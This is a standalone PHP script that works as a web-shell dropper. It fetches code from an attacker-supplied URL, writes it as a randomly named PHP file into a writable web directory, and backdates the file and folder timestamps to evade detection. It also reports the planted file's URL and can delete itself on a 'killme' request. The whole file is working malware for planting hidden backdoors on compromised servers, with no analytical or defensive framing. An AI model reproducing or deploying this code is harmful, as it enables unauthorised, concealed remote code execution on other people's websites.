<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');
$self = basename($_SERVER['SCRIPT_NAME']);
$url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
if (strpos($url, 'killme') > -1) {
    unlink($self);
    die();
}

$script_url = isset($_GET['script']) ? $_GET['script'] : false;
if (!$script_url) exit();


function random($length, $chars = '123456789abcdefghijklmnpqrstuvwxyz')
{
    $hash = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

function get_request_url($pathname)
{
    $url = '';
    if (isset($_SERVER['HTTP_HOST']) && isset($_SERVER['SCRIPT_NAME'])) {
        $url = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
        $url = dirname($url) . '/';
    }
    $url .= $pathname;
    return $url;
}

function vita_get_url_content($url)
{
    if (function_exists('file_get_contents')) {
        $file_contents = file_get_contents($url);
    } else {
        $ch = curl_init();
        $timeout = 30;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    return $file_contents;
}


function get_rand_dirname($path = "")
{
    $write_dirs = "";
    if ($path == "") {
        $path = $_SERVER['DOCUMENT_ROOT'];
    }
    $dirs = scandir($path);
    foreach ($dirs as $dirname) {
        if (is_dir($dirname) && $dirname != "..") {
            if (@is_writable($dirname)) {
                $write_dirs[] = $dirname;
            }
        }
    }
    return $write_dirs;
}

function rand_time($start_time, $end_time)
{
    $start_time = strtotime($start_time);
    $end_time = strtotime($end_time);
    return mt_rand($start_time, $end_time);
}

function build_create_rand_dir_file($script_url)
{
    $dirname = random(6);
    if (!is_dir($dirname)) {
        if (mkdir($dirname, 0777)) {
            $filename = random(6) . '.php';
            $pathname = $dirname . '/' . $filename;
            file_put_contents($pathname, vita_get_url_content($script_url));
            $url = get_request_url($pathname);
            echo $url . 'QWEASDZXCLLL';
        } else {
            echo 'createa failed!';
        }
    }
}

function build_rand_path_file($script_url)
{
    $start_time = '2011-01-01 00:00:00';
    $end_time = '2015-06-01 00:00:00';
    $rand_time = rand_time($start_time, $end_time);
    $write_dirs = get_rand_dirname();
    if (count($write_dirs) > 0) {
        $dirname = $write_dirs[rand(0, count($write_dirs) - 1)];
        $filename = random(6) . '.php';
        $pathname = $dirname . '/' . $filename;
        if (file_put_contents($pathname, vita_get_url_content($script_url))) {
            @touch($pathname, $rand_time, $rand_time);
            @touch($dirname, $rand_time, $rand_time);
            $url = get_request_url($pathname);
            echo $url . 'QWEASDZXCLLL';
        } else {
            echo 'createa failed!';
        }
    }
}

build_rand_path_file($script_url);
?>